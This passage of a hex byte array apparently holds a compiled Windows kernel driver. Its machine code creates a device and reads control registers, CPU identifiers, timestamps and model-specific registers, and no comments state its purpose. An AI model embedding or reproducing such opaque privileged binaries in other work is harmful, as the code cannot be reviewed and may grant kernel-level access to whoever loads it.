    0x40, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x41, 0xB9, 0x22, 0x00, 0x00, 0x00, 0xBA, 0x08, 0x11, 0x00,
    0x00, 0x48, 0x8B, 0xCE, 0xC6, 0x44, 0x24, 0x28, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00,
    0x00, 0xFF, 0x15, 0xD9, 0x7B, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xD8, 0x0F, 0x88, 0x08, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x70, 0x7D, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x1D,
    0x7B, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x40, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0xA5,
    0x7B, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xD8, 0x0F, 0x88, 0xC4, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
    0x24, 0x80, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x41, 0xB8, 0x08, 0x11, 0x00, 0x00, 0x48, 0x8B, 0x78,
    0x40, 0x48, 0x8B, 0xCF, 0xE8, 0xD7, 0x42, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xE8, 0x5F, 0x02, 0x00,
    0x00, 0x85, 0xC0, 0x0F, 0x85, 0x84, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x88, 0x00, 0x00,
    0x00, 0xE8, 0x2A, 0x1C, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0x88, 0x87, 0xFC, 0x10, 0x00, 0x00, 0xE8,
    0x8C, 0xFD, 0xFF, 0xFF, 0x85, 0xC0, 0x8B, 0xD8, 0x78, 0x59, 0x48, 0x8D, 0x05, 0x8F, 0xFA, 0xFF,
    0xFF, 0x48, 0x89, 0x46, 0x68, 0x48, 0x8D, 0x05, 0x54, 0xFB, 0xFF, 0xFF, 0x48, 0x89, 0x46, 0x70,
    0x48, 0x8D, 0x05, 0x59, 0xF5, 0xFF, 0xFF, 0x48, 0x89, 0x86, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D,
    0x05, 0xAB, 0xFC, 0xFF, 0xFF, 0x48, 0x89, 0x86, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x6D,
    0xF6, 0xFF, 0xFF, 0x48, 0x89, 0x86, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x86, 0x90, 0x00, 0x00,
    0x00, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x70, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x48, 0x83, 0xC4,
    0x60, 0x5F, 0xC3, 0x48, 0x8B, 0xCF, 0xE8, 0x75, 0x02, 0x00, 0x00, 0xEB, 0x09, 0x8B, 0xC8, 0xE8,
    0x4C, 0xF9, 0xFF, 0xFF, 0x8B, 0xD8, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x87, 0x7A, 0x00,
    0x00, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x71, 0x7A, 0x00, 0x00, 0xB8,
    0x0D, 0x00, 0x00, 0xC0, 0x85, 0xDB, 0x0F, 0x49, 0xD8, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x8B, 0xC3,
    0x48, 0x8B, 0x5C, 0x24, 0x70, 0x48, 0x83, 0xC4, 0x60, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xE9, 0x43, 0x41, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xE9, 0x3A, 0x41, 0x00, 0x00, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0x31, 0x48, 0xC1, 0xE2, 0x20, 0x48, 0x0B, 0xC2, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x8B, 0xC1, 0x4C, 0x8B, 0xD2, 0x0F, 0xA2, 0x41, 0x89, 0x02, 0x48,
    0x8B, 0x44, 0x24, 0x28, 0x41, 0x89, 0x18, 0x48, 0x8B, 0x5C, 0x24, 0x08, 0x41, 0x89, 0x09, 0x89,
    0x10, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x10, 0x8B, 0xC1, 0x0F, 0xA2, 0x89, 0x04, 0x24, 0x8B, 0xC2, 0x89,
    0x5C, 0x24, 0x04, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xC4, 0x10, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x10, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x0F, 0xA2, 0x89, 0x04, 0x24,
    0x8B, 0xC3, 0x89, 0x4C, 0x24, 0x08, 0x48, 0xC1, 0xE8, 0x18, 0x89, 0x54, 0x24, 0x0C, 0x48, 0x83,
    0xC4, 0x10, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0x20, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0x20, 0xE0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0x32, 0x48, 0xC1, 0xE2, 0x20, 0x48, 0x0B, 0xC2, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x87, 0x11, 0x8B, 0xC2, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x87, 0x11, 0x48, 0x8B, 0xC2, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xC1, 0x01, 0x83, 0xC0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC,
    0x8B, 0xC1, 0x8B, 0xCA, 0x48, 0x0F, 0xAF, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x48, 0x8B, 0xCA, 0xE8, 0x5F, 0x45, 0x00,
    0x00, 0x85, 0xC0, 0x79, 0x08, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x8B, 0x0B,
    0x8B, 0xD0, 0x33, 0xC0, 0x48, 0x0F, 0xA3, 0xD1, 0x0F, 0x92, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0x01, 0x33, 0xC0, 0xBA, 0x40, 0x00, 0x00, 0x00, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x83, 0xEA, 0x01, 0x49, 0x0F, 0xA3, 0xD0, 0x73, 0x04, 0x48, 0x83, 0xC0, 0x01, 0x48, 0x85,
    0xD2, 0x75, 0xED, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x33,
    0xD2, 0x41, 0xB8, 0x08, 0x11, 0x00, 0x00, 0x48, 0x8B, 0xD9, 0xE8, 0x51, 0x40, 0x00, 0x00, 0x48,
    0x8B, 0xCB, 0xE8, 0x49, 0x4D, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xF8, 0x75, 0x55, 0x48, 0x8D, 0x4B,
    0x20, 0xE8, 0xAA, 0x54, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xF8, 0x75, 0x37, 0x48, 0x8D, 0x4B, 0x50,
    0xE8, 0x9B, 0x54, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xF8, 0x75, 0x17, 0xC7, 0x43, 0x18, 0x62, 0x69,
    0x72, 0x64, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20,
    0x5F, 0xC3, 0x48, 0x8B, 0x4B, 0x20, 0xE8, 0xE5, 0x54, 0x00, 0x00, 0x48, 0xC7, 0x43, 0x20, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0x0B, 0xE8, 0x35, 0x4D, 0x00, 0x00, 0x48, 0xC7, 0x03, 0x00, 0x00,
    0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x8B, 0xC7, 0x48, 0x83,
    0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,
    0x8B, 0xF9, 0x48, 0x8B, 0x49, 0x50, 0xE8, 0x95, 0x54, 0x00, 0x00, 0x48, 0x8B, 0x4F, 0x20, 0x33,
    0xF6, 0x48, 0x89, 0x77, 0x50, 0xE8, 0x86, 0x54, 0x00, 0x00, 0x48, 0x8B, 0x0F, 0x48, 0x89, 0x77,
    0x20, 0xE8, 0xDA, 0x4C, 0x00, 0x00, 0x48, 0x8B, 0x5F, 0x08, 0x48, 0x85, 0xDB, 0x48, 0x89, 0x37,
    0x48, 0x89, 0x77, 0x08, 0x74, 0x1B, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0xCB, 0x48, 0x8B, 0x5B, 0x08, 0xE8, 0xF4, 0x63, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x75,
    0xEF, 0x48, 0x8B, 0x5F, 0x10, 0x48, 0x89, 0x77, 0x10, 0x48, 0x85, 0xDB, 0x74, 0x12, 0x66, 0x90,
    0x48, 0x8B, 0xCB, 0x48, 0x8B, 0x1B, 0xE8, 0xD5, 0x63, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x75, 0xF0,
    0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF1, 0xB9, 0x68, 0x06, 0x00, 0x00, 0x48, 0x8B, 0xEA, 0xBF,
    0xF8, 0xFF, 0xFF, 0xFF, 0xE8, 0x57, 0x63, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x48,
    0x89, 0x45, 0x00, 0x74, 0x2B, 0x48, 0x8D, 0x48, 0x28, 0xE8, 0x02, 0x4C, 0x00, 0x00, 0x85, 0xC0,
    0x8B, 0xF8, 0x75, 0x0C, 0x48, 0x89, 0x33, 0xC7, 0x43, 0x08, 0x64, 0x72, 0x69, 0x62, 0xEB, 0x12,
    0x48, 0x8B, 0xCB, 0xE8, 0x68, 0x63, 0x00, 0x00, 0x48, 0xC7, 0x45, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x8B, 0xC7, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24,
    0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4D, 0x8B, 0x48, 0x18, 0x4D, 0x85, 0xC9, 0x74, 0x3A, 0x48, 0x8B, 0x42, 0x38, 0x48, 0x85, 0xC0,
    0x74, 0x31, 0x48, 0x81, 0xE9, 0x03, 0x83, 0x22, 0x00, 0x74, 0x20, 0x48, 0x83, 0xE9, 0x04, 0x74,
    0x0F, 0x48, 0x83, 0xF9, 0x04, 0x75, 0x1C, 0x8D, 0x51, 0xFE, 0x49, 0x8B, 0xC9, 0x48, 0xFF, 0xE0,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xC9, 0x48, 0xFF, 0xE0, 0x33, 0xD2, 0x49, 0x8B, 0xC9,
    0x48, 0xFF, 0xE0, 0xB8, 0xE0, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x44, 0x0F, 0xBE, 0x09, 0x45, 0x85, 0xC9, 0x74, 0x31, 0x44, 0x0F, 0xBE, 0x12, 0x66, 0x66, 0x90,
    0x48, 0x83, 0xC1, 0x01, 0x45, 0x85, 0xD2, 0x4C, 0x8B, 0xC2, 0x41, 0x8B, 0xC2, 0x74, 0x12, 0x90,
    0x49, 0x83, 0xC0, 0x01, 0x41, 0x3B, 0xC1, 0x74, 0x14, 0x41, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x75,
    0xEF, 0x44, 0x0F, 0xBE, 0x09, 0x45, 0x85, 0xC9, 0x75, 0xD6, 0x33, 0xC0, 0xC3, 0xB8, 0x01, 0x00,
    0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x48,
    0x83, 0xEC, 0x30, 0x48, 0x8B, 0x31, 0x48, 0x8D, 0x81, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x8B, 0xE9,
    0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x49, 0x8B, 0xF8, 0x44, 0x8B, 0xE2, 0x48, 0x8B, 0xE9, 0x48,
    0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x28, 0x00, 0x0F, 0x82, 0x6B,
    0x01, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC5,
    0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x4D, 0x01, 0x00,
    0x00, 0x81, 0x7D, 0x08, 0x64, 0x72, 0x69, 0x62, 0x0F, 0x85, 0x40, 0x01, 0x00, 0x00, 0x8D, 0x42,
    0xFF, 0x83, 0xF8, 0x02, 0x0F, 0x87, 0x34, 0x01, 0x00, 0x00, 0x49, 0x8D, 0x80, 0x00, 0x10, 0x00,
    0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x82, 0x21, 0x01, 0x00, 0x00, 0x49, 0x8B, 0xC0,
    0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x0D, 0x01, 0x00,
    0x00, 0xB9, 0x38, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x50, 0xE8, 0x90, 0x61, 0x00, 0x00,
    0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x0F, 0x84, 0x96, 0x00, 0x00, 0x00, 0xC7, 0x00, 0x15, 0x09,
    0x90, 0x18, 0x44, 0x89, 0x60, 0x04, 0x48, 0xC7, 0x40, 0x08, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x40,
    0x28, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x78, 0x10, 0x4C, 0x89, 0x68, 0x18, 0x48, 0x8B, 0x44,
    0x24, 0x70, 0x48, 0x8B, 0xD5, 0x48, 0x8B, 0xCB, 0x48, 0x89, 0x43, 0x20, 0x8B, 0x85, 0x50, 0x06,
    0x00, 0x00, 0x89, 0x43, 0x2C, 0x8B, 0x85, 0x54, 0x06, 0x00, 0x00, 0x89, 0x43, 0x30, 0x8B, 0x85,
    0x58, 0x06, 0x00, 0x00, 0x89, 0x43, 0x34, 0xE8, 0x44, 0xF1, 0xFF, 0xFF, 0x48, 0x8B, 0x0E, 0x48,
    0x8D, 0x54, 0x24, 0x20, 0xE8, 0xE7, 0x4A, 0x00, 0x00, 0x48, 0x8B, 0x7E, 0x10, 0x48, 0x85, 0xFF,
    0x74, 0x09, 0x48, 0x8B, 0x07, 0x48, 0x89, 0x46, 0x10, 0xEB, 0x4F, 0x48, 0x8B, 0x0E, 0x48, 0x8D,
    0x54, 0x24, 0x20, 0xE8, 0xE8, 0x4A, 0x00, 0x00, 0xB9, 0x18, 0x00, 0x00, 0x00, 0xE8, 0xFE, 0x60,
    0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF8, 0x75, 0x23, 0x48, 0x8B, 0xCB, 0xE8, 0x4E, 0x61,
    0x00, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x8B, 0x6C, 0x24, 0x58, 0x48, 0x8B,
    0x74, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0xC3, 0x48, 0x8B, 0x0E,
    0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0x86, 0x4A, 0x00, 0x00, 0x48, 0x8B, 0x46, 0x08, 0x48, 0x8D,
    0x54, 0x24, 0x20, 0x48, 0x89, 0x43, 0x08, 0x48, 0x89, 0x5E, 0x08, 0xC7, 0x47, 0x10, 0x01, 0x00,
    0x00, 0x00, 0x48, 0x89, 0x5F, 0x08, 0x48, 0x8B, 0x45, 0x20, 0x48, 0x89, 0x07, 0x48, 0x89, 0x7D,
    0x20, 0x48, 0x8B, 0x0E, 0xE8, 0x77, 0x4A, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0xEB, 0xA6, 0x33, 0xC0,
    0xEB, 0xA7, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48,
    0x8B, 0x32, 0x48, 0x8D, 0x82, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8B, 0xEA, 0x48, 0x3D, 0x00, 0x20,
    0x00, 0x00, 0x48, 0x8B, 0xF9, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xC6, 0x44,
    0x24, 0x28, 0x00, 0x0F, 0x82, 0x2F, 0x01, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC2, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85,
    0xC0, 0x0F, 0x85, 0x11, 0x01, 0x00, 0x00, 0x81, 0x7A, 0x08, 0x64, 0x72, 0x69, 0x62, 0x0F, 0x85,
    0x04, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x87, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00, 0x20, 0x00,
    0x00, 0x0F, 0x82, 0xF1, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC7, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1,
    0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0xDD, 0x00, 0x00, 0x00, 0x81, 0x3F, 0x15, 0x09, 0x90,
    0x18, 0x0F, 0x85, 0xD1, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48,
    0x89, 0x5C, 0x24, 0x40, 0xE8, 0x97, 0x49, 0x00, 0x00, 0x48, 0x8B, 0x5E, 0x10, 0x48, 0x85, 0xDB,
    0x74, 0x09, 0x48, 0x8B, 0x03, 0x48, 0x89, 0x46, 0x10, 0xEB, 0x44, 0x48, 0x8B, 0x0E, 0x48, 0x8D,
    0x54, 0x24, 0x20, 0xE8, 0x98, 0x49, 0x00, 0x00, 0xB9, 0x18, 0x00, 0x00, 0x00, 0xE8, 0xAE, 0x5F,
    0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x75, 0x18, 0x8D, 0x43, 0xF8, 0x48, 0x8B, 0x5C,
    0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30,
    0x5F, 0xC3, 0x48, 0x8B, 0x0E, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0x41, 0x49, 0x00, 0x00, 0x83,
    0x47, 0x28, 0x01, 0x48, 0x8B, 0x45, 0x20, 0x48, 0x85, 0xC0, 0x74, 0x12, 0x66, 0x66, 0x66, 0x90,
    0x48, 0x39, 0x78, 0x08, 0x74, 0x2F, 0x48, 0x8B, 0x00, 0x48, 0x85, 0xC0, 0x75, 0xF2, 0xC7, 0x43,
    0x10, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x7B, 0x08, 0x48, 0x8B, 0x45, 0x20, 0x48, 0x89, 0x03,
    0x48, 0x89, 0x5D, 0x20, 0x48, 0x8B, 0x0E, 0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0x1F, 0x49, 0x00,
    0x00, 0x33, 0xC0, 0xEB, 0x98, 0x83, 0x40, 0x10, 0x01, 0x48, 0x8B, 0x46, 0x10, 0x48, 0x8D, 0x54,
    0x24, 0x20, 0x48, 0x89, 0x03, 0x48, 0x8B, 0x0E, 0x48, 0x89, 0x5E, 0x10, 0xE8, 0xFF, 0x48, 0x00,
    0x00, 0x33, 0xC0, 0xE9, 0x75, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74,
    0x24, 0x50, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x48,
    0x83, 0xEC, 0x30, 0x48, 0x8B, 0x2A, 0x45, 0x33, 0xED, 0x48, 0x8D, 0x82, 0x00, 0x10, 0x00, 0x00,
    0x45, 0x32, 0xE4, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x48, 0x8B, 0xF2, 0x48, 0x8B, 0xF9, 0x4C,
    0x89, 0x6C, 0x24, 0x20, 0x44, 0x88, 0x6C, 0x24, 0x28, 0x0F, 0x82, 0x61, 0x01, 0x00, 0x00, 0x48,
    0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC2, 0x48, 0x23, 0xC1, 0x48,
    0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x43, 0x01, 0x00, 0x00, 0x81, 0x7A, 0x08,
    0x64, 0x72, 0x69, 0x62, 0x0F, 0x85, 0x36, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x87, 0x00, 0x10, 0x00,
    0x00, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x82, 0x23, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC7,
    0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x09, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x0F, 0x01, 0x00,
    0x00, 0x81, 0x3F, 0x15, 0x09, 0x90, 0x18, 0x0F, 0x85, 0x03, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4D,
    0x00, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x89, 0x5C, 0x24, 0x50, 0xE8, 0x10, 0x48, 0x00, 0x00,
    0x48, 0x8B, 0x5E, 0x20, 0x4D, 0x8B, 0xDD, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0x9C, 0x00, 0x00, 0x00,
    0x48, 0x39, 0x7B, 0x08, 0x74, 0x10, 0x4C, 0x8B, 0xDB, 0x48, 0x8B, 0x1B, 0x48, 0x85, 0xDB, 0x75,
    0xEF, 0xE9, 0x86, 0x00, 0x00, 0x00, 0x8B, 0x43, 0x10, 0x83, 0xF8, 0x01, 0x76, 0x0A, 0x83, 0x47,
    0x28, 0xFF, 0x83, 0x43, 0x10, 0xFF, 0xEB, 0x74, 0x4D, 0x85, 0xDB, 0x74, 0x08, 0x48, 0x8B, 0x03,
    0x49, 0x89, 0x03, 0xEB, 0x07, 0x48, 0x8B, 0x03, 0x48, 0x89, 0x46, 0x20, 0x48, 0x8B, 0x45, 0x10,
    0x48, 0x89, 0x03, 0x48, 0x89, 0x5D, 0x10, 0x8B, 0x47, 0x28, 0x83, 0xF8, 0x01, 0x76, 0x06, 0x83,
    0x47, 0x28, 0xFF, 0xEB, 0x47, 0xC7, 0x07, 0x16, 0x09, 0x90, 0x18, 0x48, 0x8B, 0x45, 0x08, 0x41,
    0xB4, 0x01, 0x48, 0x3B, 0xC7, 0x75, 0x0A, 0x48, 0x8B, 0x47, 0x08, 0x48, 0x89, 0x45, 0x08, 0xEB,
    0x2B, 0x48, 0x8B, 0x4D, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x22, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x48, 0x8B, 0x41, 0x08, 0x48, 0x3B, 0xC7, 0x74, 0x0B, 0x48, 0x8B, 0x49, 0x08, 0x48, 0x85, 0xC9,
    0x75, 0xEE, 0xEB, 0x08, 0x48, 0x8B, 0x47, 0x08, 0x48, 0x89, 0x41, 0x08, 0x48, 0x8B, 0x4D, 0x00,
    0x48, 0x8D, 0x54, 0x24, 0x20, 0xE8, 0x76, 0x47, 0x00, 0x00, 0x45, 0x84, 0xE4, 0x74, 0x1E, 0x48,
    0x8B, 0x47, 0x10, 0x48, 0x85, 0xC0, 0x74, 0x0D, 0x4C, 0x8B, 0x47, 0x20, 0x48, 0x8B, 0x57, 0x18,
    0x48, 0x8B, 0xCF, 0xFF, 0xD0, 0x48, 0x8B, 0xCF, 0xE8, 0xD3, 0x5D, 0x00, 0x00, 0x48, 0x85, 0xDB,
    0x48, 0x8B, 0x5C, 0x24, 0x50, 0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x41, 0x0F, 0x45, 0xC5, 0xEB, 0x05,
    0xB8, 0xFE, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x6C, 0x24, 0x58, 0x48, 0x8B, 0x74, 0x24, 0x60, 0x48,
    0x83, 0xC4, 0x30, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D, 0x82, 0x00, 0x10, 0x00,
    0x00, 0x48, 0x8B, 0xFA, 0x48, 0x8B, 0xD9, 0x48, 0x3D, 0x00, 0x20, 0x00, 0x00, 0x0F, 0x82, 0x90,
    0x00, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, 0x48, 0x8B, 0xC2,
    0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x76, 0x81, 0x7A, 0x08,
    0x64, 0x72, 0x69, 0x62, 0x75, 0x6D, 0x48, 0x8D, 0x83, 0x00, 0x10, 0x00, 0x00, 0x48, 0x3D, 0x00,
    0x20, 0x00, 0x00, 0x72, 0x5E, 0x48, 0x8B, 0xC3, 0x48, 0x23, 0xC1, 0x48, 0x3B, 0xC1, 0x74, 0x05,
    0x48, 0x85, 0xC0, 0x75, 0x4E, 0x81, 0x3B, 0x15, 0x09, 0x90, 0x18, 0x75, 0x46, 0x4C, 0x8D, 0x4C,
    0x24, 0x30, 0x48, 0x8B, 0xCB, 0xC7, 0x44, 0x24, 0x30, 0xE0, 0xFF, 0xFF, 0xFF, 0xE8, 0xDE, 0xEC,
